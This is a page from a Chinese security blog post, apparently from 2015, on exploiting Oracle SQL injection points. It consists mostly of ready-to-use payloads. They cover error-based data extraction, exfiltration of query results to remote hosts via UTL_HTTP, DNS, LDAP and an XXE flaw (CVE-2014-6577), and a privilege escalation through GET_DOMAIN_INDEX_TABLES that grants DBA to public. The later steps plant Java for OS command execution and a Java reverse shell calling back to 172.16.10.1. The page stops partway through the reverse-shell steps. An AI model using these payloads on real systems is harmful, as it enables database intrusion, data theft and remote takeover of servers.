@@ -1,0 +1,611 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>Oracle Sql注入利用方法 | 随风&#39;S Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="iswin">
+    
+
+    
+    <meta name="description" content="本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。  数据获取报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访">
+<meta name="keywords" content="JAVA,ORACLE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Oracle Sql注入利用方法">
+<meta property="og:url" content="https://www.iswin.org/2015/06/13/hack-oracle/index.html">
+<meta property="og:site_name" content="随风&#39;S Blog">
+<meta property="og:description" content="本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。  数据获取报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-01-23T17:22:24.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Oracle Sql注入利用方法">
+<meta name="twitter:description" content="本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。  数据获取报错注入的几种方式0x1 utl_inaddr.get_host_name这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访">
+
+    
+    <link rel="alternative" href="/atom.xml" title="随风&#39;S Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/author.jpg" alt="随风&#39;S Blog" title="随风&#39;S Blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="随风&#39;S Blog">随风&#39;S Blog</a></h1>
+				<h2 class="blog-motto">网络安全爱好者</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/atom.xml">RSS</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:www.iswin.org">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2015/06/13/hack-oracle/" title="Oracle Sql注入利用方法" itemprop="url">Oracle Sql注入利用方法</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="iswin" target="_blank" itemprop="author">iswin</a>
+		
+  <p class="article-time">
+    <time datetime="2015-06-13T06:57:34.000Z" itemprop="datePublished"> 发表于 2015-06-13</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#数据获取"><span class="toc-number">1.</span> <span class="toc-text">数据获取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入的几种方式"><span class="toc-number">1.1.</span> <span class="toc-text">报错注入的几种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-utl-inaddr-get-host-name"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x1 utl_inaddr.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-ctxsys-drithsx-sn"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x2 ctxsys.drithsx.sn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-XMLType"><span class="toc-number">1.1.3.</span> <span class="toc-text">0x3 XMLType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4-dbms-xdb-version-checkin"><span class="toc-number">1.1.4.</span> <span class="toc-text">0x4 dbms_xdb_version.checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5-dbms-xdb-version-makeversioned"><span class="toc-number">1.1.5.</span> <span class="toc-text">0x5 dbms_xdb_version.makeversioned</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x6-dbms-xdb-version-uncheckout"><span class="toc-number">1.1.6.</span> <span class="toc-text">0x6 dbms_xdb_version.uncheckout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x7-dbms-utility-sqlid-to-sqlhash"><span class="toc-number">1.1.7.</span> <span class="toc-text">0x7 dbms_utility.sqlid_to_sqlhash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UTL-HTTP-request的使用"><span class="toc-number">1.2.</span> <span class="toc-text">UTL_HTTP.request的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UTL-INADDR-GET-HOST-ADDRESS-amp-SYS-DBMS-LDAP-INIT"><span class="toc-number">1.3.</span> <span class="toc-text">UTL_INADDR.GET_HOST_ADDRESS&amp;SYS.DBMS_LDAP.INIT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-XXE-CVE-2014-6577"><span class="toc-number">1.4.</span> <span class="toc-text">Oracle XXE(CVE-2014-6577)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle-提权漏洞"><span class="toc-number">2.</span> <span class="toc-text">Oracle 提权漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GET-DOMAIN-INDEX-TABLES函数注入漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">GET_DOMAIN_INDEX_TABLES函数注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#权限提升"><span class="toc-number">2.1.1.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行"><span class="toc-number">2.1.2.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#创建JAVA代码"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">创建JAVA代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#赋予JAVA执行权限"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">赋予JAVA执行权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#创建函数"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">创建函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#赋予函数执行权限"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">赋予函数执行权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行命令"><span class="toc-number">2.1.2.5.</span> <span class="toc-text">执行命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹SHELL"><span class="toc-number">2.1.3.</span> <span class="toc-text">反弹SHELL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#创建JAVA代码-1"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">创建JAVA代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#赋予JAVA执行权限-1"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">赋予JAVA执行权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#创建函数-1"><span class="toc-number">2.1.3.3.</span> <span class="toc-text">创建函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#赋予函数执行权限-1"><span class="toc-number">2.1.3.4.</span> <span class="toc-text">赋予函数执行权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#反弹SHELL-1"><span class="toc-number">2.1.3.5.</span> <span class="toc-text">反弹SHELL</span></a></li></ol></li></ol></li></ol></li></ol>
+		
+		</div>
+		
+		<blockquote>
+<p>本文主要讨论在得到一枚oracle注入点时，如何通过Oracle自带函数或者缺陷获取数据，权限提升以及获得系统权限。</p>
+</blockquote>
+<h1 id="数据获取"><a href="#数据获取" class="headerlink" title="数据获取"></a>数据获取</h1><h2 id="报错注入的几种方式"><a href="#报错注入的几种方式" class="headerlink" title="报错注入的几种方式"></a>报错注入的几种方式</h2><h3 id="0x1-utl-inaddr-get-host-name"><a href="#0x1-utl-inaddr-get-host-name" class="headerlink" title="0x1 utl_inaddr.get_host_name"></a>0x1 utl_inaddr.get_host_name</h3><p>这种方法在<em>Oracle 8g，9g，10g</em>中不需要任何权限，但是在<em>Oracle 11g</em>以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and 1=utl_inaddr.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="0x2-ctxsys-drithsx-sn"><a href="#0x2-ctxsys-drithsx-sn" class="headerlink" title="0x2 ctxsys.drithsx.sn"></a>0x2 ctxsys.drithsx.sn</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x3-XMLType"><a href="#0x3-XMLType" class="headerlink" title="0x3 XMLType"></a>0x3 XMLType</h3><p>在使用这个XMLType进行报错时，很多人不知道为什么要用chr(60)，通过ascii查询可以看到，60:&lt;,58:’:’,62:’&gt;’,查了下相关的api，发现xmltype在进行解析的时候必须以&lt;开头&gt;结尾，这里:冒号在这是必不可少的，至于为什么是冒号这个我也没查到，另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，有replace函数替换成其他非空字符就可以。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> <span class="keyword">upper</span>(<span class="keyword">XMLType</span>(<span class="keyword">chr</span>(<span class="number">60</span>)||<span class="keyword">chr</span>(<span class="number">58</span>)||(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)||<span class="keyword">chr</span>(<span class="number">62</span>))) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="0x4-dbms-xdb-version-checkin"><a href="#0x4-dbms-xdb-version-checkin" class="headerlink" title="0x4 dbms_xdb_version.checkin"></a>0x4 dbms_xdb_version.checkin</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x5-dbms-xdb-version-makeversioned"><a href="#0x5-dbms-xdb-version-makeversioned" class="headerlink" title="0x5 dbms_xdb_version.makeversioned"></a>0x5 dbms_xdb_version.makeversioned</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> dbms_xdb_version.makeversioned((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x6-dbms-xdb-version-uncheckout"><a href="#0x6-dbms-xdb-version-uncheckout" class="headerlink" title="0x6 dbms_xdb_version.uncheckout"></a>0x6 dbms_xdb_version.uncheckout</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> dbms_xdb_version.uncheckout((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x7-dbms-utility-sqlid-to-sqlhash"><a href="#0x7-dbms-utility-sqlid-to-sqlhash" class="headerlink" title="0x7 dbms_utility.sqlid_to_sqlhash"></a>0x7 dbms_utility.sqlid_to_sqlhash</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">SELECT</span> dbms_utility.sqlid_to_sqlhash((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h2 id="UTL-HTTP-request的使用"><a href="#UTL-HTTP-request的使用" class="headerlink" title="UTL_HTTP.request的使用"></a>UTL_HTTP.request的使用</h2><p>通过utl_http.request我们可以将查询的结果发送到远程服务器上，在遇到盲注时非常有用，要使用该方法用户需要有utl_http访问网络的权限。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (UTL_HTTP.request('http://www.iswin.org:80/'||(<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$<span class="keyword">version</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>))=<span class="number">1</span>—</span><br></pre></td></tr></table></figure></p>
+<h2 id="UTL-INADDR-GET-HOST-ADDRESS-amp-SYS-DBMS-LDAP-INIT"><a href="#UTL-INADDR-GET-HOST-ADDRESS-amp-SYS-DBMS-LDAP-INIT" class="headerlink" title="UTL_INADDR.GET_HOST_ADDRESS&amp;SYS.DBMS_LDAP.INIT"></a>UTL_INADDR.GET_HOST_ADDRESS&amp;SYS.DBMS_LDAP.INIT</h2><p>很多时候数据服务器都是站库分离的，而且不一定能出网，有时候可能会允许DNS请求，所以该方法能在一定情况下奏效。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> utl_inaddr.get_host_address((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)||<span class="string">'.iswin.org'</span>) <span class="keyword">from</span> dual)<span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--￼</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> SYS.DBMS_LDAP.INIT((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)||<span class="string">'.iswin.org'</span>) <span class="keyword">from</span> dual)<span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--￼</span></span><br></pre></td></tr></table></figure>
+<h2 id="Oracle-XXE-CVE-2014-6577"><a href="#Oracle-XXE-CVE-2014-6577" class="headerlink" title="Oracle XXE(CVE-2014-6577)"></a>Oracle XXE(CVE-2014-6577)</h2><p><strong><em>受影响版本：11.2.0.3, 11.2.0.4, 12.1.0.1 和12.1.0.2</em></strong></p>
+<p>这里Oracle的XXE的利用效果和UTL_http的效果差不多，都是将数据传输到远端服务器上，但是，由于extractvalue()函数对所有数据库用户都可以使用，不存在权限的问题，所以当在低权限没有UTL_http访问权限时，这个不失为一个好方法。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> extractvalue(<span class="keyword">xmltype</span>(<span class="string">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://172.16.10.1:8080/'</span>||(<span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)||<span class="string">'"&gt; %remote;]&gt;'</span>),<span class="string">'/l'</span>) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="Oracle-提权漏洞"><a href="#Oracle-提权漏洞" class="headerlink" title="Oracle 提权漏洞"></a>Oracle 提权漏洞</h1><h2 id="GET-DOMAIN-INDEX-TABLES函数注入漏洞"><a href="#GET-DOMAIN-INDEX-TABLES函数注入漏洞" class="headerlink" title="GET_DOMAIN_INDEX_TABLES函数注入漏洞"></a>GET_DOMAIN_INDEX_TABLES函数注入漏洞</h2><p>影响版本:<strong><em>Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2</em></strong></p>
+<p>漏洞的成因是该函数的参数存在注入，而该函数的所有者是sys，所以通过注入就可以执行任意sql，该函数的执行权限为public，所以只要遇到一个oracle的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。</p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS _OUTPUT".PUT(:P1);<span class="keyword">EXECUTE</span> <span class="keyword">IMMEDIATE</span> <span class="string">''</span><span class="keyword">DECLARE</span> <span class="keyword">PRAGMA</span> AUTONOMOUS_TRANSACTION;<span class="keyword">BEGIN</span> <span class="keyword">EXECUTE</span> <span class="keyword">IMMEDIATE</span> <span class="string">''''</span><span class="keyword">grant</span> dba <span class="keyword">to</span> <span class="keyword">public</span><span class="string">''''</span>;<span class="keyword">END</span>;'';<span class="keyword">END</span>;<span class="comment">--','SYS',0,'1',0)) is not null--</span></span><br></pre></td></tr></table></figure>
+<p>权限提升之后就可以做很多事了，因为Oracle可以执行JAVA代码，所以在提升权限后具体怎么操作，就看各自的JAVA水平了。<br>这里给出几种常见的利用方式。</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="创建JAVA代码"><a href="#创建JAVA代码" class="headerlink" title="创建JAVA代码"></a>创建JAVA代码</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "Command" as import java.io.*;public class Command&#123;public static String exec(String cmd) throws Exception&#123;String sb="";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+"\n";inBr.close();in.close();return sb;&#125;&#125;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure>
+<h4 id="赋予JAVA执行权限"><a href="#赋予JAVA执行权限" class="headerlink" title="赋予JAVA执行权限"></a>赋予JAVA执行权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''&lt;&lt;ALL FILES&gt;&gt;'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h4 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String''''''''; '''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h4 id="赋予函数执行权限"><a href="#赋予函数执行权限" class="headerlink" title="赋予函数执行权限"></a>赋予函数执行权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on cmd to public'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> sys.cmd(<span class="string">'cmd.exe /c whoami'</span>) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="反弹SHELL"><a href="#反弹SHELL" class="headerlink" title="反弹SHELL"></a>反弹SHELL</h3><h4 id="创建JAVA代码-1"><a href="#创建JAVA代码-1" class="headerlink" title="创建JAVA代码"></a>创建JAVA代码</h4><p>当执行命令没有什么太大的帮助时，我们可以反弹一个交互式的shell，这样会方便很多。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "shell" as import java.io.*;import java.net.*;public class shell&#123;public static void run() throws Exception &#123;Socket s = new Socket("172.16.10.1", 80);Process p = Runtime.getRuntime().exec("cmd.exe");new T(p.getInputStream(), s.getOutputStream()).start();new T(p.getErrorStream(), s.getOutputStream()).start();new T(s.getInputStream(), p.getOutputStream()).start();&#125;static class T extends Thread &#123;private InputStream i;private OutputStream u;public T(InputStream in, OutputStream out) &#123;this.u = out;this.i = in;&#125;public void run() &#123;BufferedReader n = new BufferedReader(new InputStreamReader(i));BufferedWriter w = new BufferedWriter(new OutputStreamWriter(u));char f[] = new char[8192];int l;try &#123;while ((l = n.read(f, 0, f.length)) &gt; 0) &#123;w.write(f, 0, l);w.flush();&#125;&#125; catch (IOException e) &#123;&#125;try &#123;if (n != null)n.close();if (w != null)w.close();&#125; catch (Exception e) &#123;&#125;&#125;&#125;&#125;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="赋予JAVA执行权限-1"><a href="#赋予JAVA执行权限-1" class="headerlink" title="赋予JAVA执行权限"></a>赋予JAVA执行权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''&lt;&gt;'''''''', ''''''''*'''''''' );end;'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h4 id="创建函数-1"><a href="#创建函数-1" class="headerlink" title="创建函数"></a>创建函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; '''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
